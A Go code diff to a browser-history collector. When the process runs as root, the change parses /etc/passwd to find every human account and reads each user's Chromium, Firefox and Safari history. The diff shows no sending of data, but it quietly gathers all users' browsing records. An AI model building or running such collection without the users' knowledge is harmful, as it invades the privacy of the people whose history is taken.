@@ -13,15 +13,21 @@ package collector
 //   macOS:   ~/Library/Application Support/{browser}
 //   Linux:   ~/.config/{browser}  or  ~/.mozilla/firefox
 //   Windows: %LOCALAPPDATA%\{browser}\User Data
+//
+// When running as root (e.g. installed as a systemd service), os.UserHomeDir()
+// returns /root which has no browser profiles. Instead we enumerate all real
+// human user home directories from /etc/passwd (UID >= 1000, shell not nologin)
+// and scan each one.
 
 import (
+	"bufio"
 	"database/sql"
-	"fmt"
 	"io"
 	"os"
 	"path/filepath"
 	"runtime"
 	"sort"
+	"strconv"
 	"strings"
 	"time"
 
@@ -42,27 +48,29 @@ type HistoryEntry struct {
 }
 
 func (b *BrowserHistory) Collect() (map[string]interface{}, error) {
-	homeDir, err := os.UserHomeDir()
-	if err != nil {
-		return nil, fmt.Errorf("could not get home dir: %w", err)
+	homeDirs := resolveHomeDirs()
+	if len(homeDirs) == 0 {
+		return map[string]interface{}{"top_recent_urls": []HistoryEntry{}}, nil
 	}
 
 	var allEntries []HistoryEntry
 
-	// ── Chromium-based browsers ───────────────────────────────────────────────
-	for _, spec := range chromiumProfileDirs(homeDir) {
-		allEntries = append(allEntries, fetchChromiumHistory(spec.path, spec.name)...)
-	}
+	for _, homeDir := range homeDirs {
+		// ── Chromium-based browsers ───────────────────────────────────────────
+		for _, spec := range chromiumProfileDirs(homeDir) {
+			allEntries = append(allEntries, fetchChromiumHistory(spec.path, spec.name)...)
+		}
 
-	// ── Firefox ───────────────────────────────────────────────────────────────
-	for _, profilesDir := range firefoxProfilesDirs(homeDir) {
-		allEntries = append(allEntries, fetchFirefoxHistory(profilesDir)...)
-	}
+		// ── Firefox ───────────────────────────────────────────────────────────
+		for _, profilesDir := range firefoxProfilesDirs(homeDir) {
+			allEntries = append(allEntries, fetchFirefoxHistory(profilesDir)...)
+		}
 
-	// ── Safari (macOS only) ───────────────────────────────────────────────────
-	if runtime.GOOS == "darwin" {
-		safariPath := filepath.Join(homeDir, "Library", "Safari", "History.db")
-		allEntries = append(allEntries, fetchSafariHistory(safariPath)...)
+		// ── Safari (macOS only) ───────────────────────────────────────────────
+		if runtime.GOOS == "darwin" {
+			safariPath := filepath.Join(homeDir, "Library", "Safari", "History.db")
+			allEntries = append(allEntries, fetchSafariHistory(safariPath)...)
+		}
 	}
 
 	if len(allEntries) == 0 {
@@ -77,6 +85,83 @@ func (b *BrowserHistory) Collect() (map[string]interface{}, error) {
 	}
 
 	return map[string]interface{}{"top_recent_urls": allEntries}, nil
+}
+
+// resolveHomeDirs returns the list of home directories to scan for browser history.
+//
+// Strategy:
+//   - Always include the current user's home directory (covers dev/local runs).
+//   - On Linux/macOS, when running as root (e.g. systemd service), also parse
+//     /etc/passwd to find all real human accounts (UID >= 1000, login shell
+//     that isn't nologin/false) and add their home directories.
+//   - Deduplicates the result so we never scan the same directory twice.
+func resolveHomeDirs() []string {
+	seen := map[string]bool{}
+	var dirs []string
+
+	add := func(dir string) {
+		if dir == "" || seen[dir] {
+			return
+		}
+		if _, err := os.Stat(dir); err == nil {
+			seen[dir] = true
+			dirs = append(dirs, dir)
+		}
+	}
+
+	// Always start with the process owner's home dir.
+	if h, err := os.UserHomeDir(); err == nil {
+		add(h)
+	}
+
+	// On Linux/macOS running as root, also scan real user home dirs.
+	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		if os.Getuid() == 0 {
+			for _, dir := range humanHomeDirsFromPasswd() {
+				add(dir)
+			}
+		}
+	}
+
+	return dirs
+}
+
+// humanHomeDirsFromPasswd parses /etc/passwd and returns the home directories
+// of accounts with UID >= 1000 (real human users on Linux/macOS) whose login
+// shell is not a nologin/false variant.
+func humanHomeDirsFromPasswd() []string {
+	f, err := os.Open("/etc/passwd")
+	if err != nil {
+		return nil
+	}
+	defer f.Close()
+
+	var dirs []string
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		// passwd format: username:password:uid:gid:comment:home:shell
+		fields := strings.Split(line, ":")
+		if len(fields) < 7 {
+			continue
+		}
+		uid, err := strconv.Atoi(fields[2])
+		if err != nil || uid < 1000 {
+			continue // skip system accounts
+		}
+		shell := fields[6]
+		if strings.Contains(shell, "nologin") || strings.Contains(shell, "false") {
+			continue // skip non-interactive accounts
+		}
+		homeDir := fields[5]
+		if homeDir != "" {
+			dirs = append(dirs, homeDir)
+		}
+	}
+	return dirs
 }
 
 // ─── cross-platform profile path resolution ───────────────────────────────────
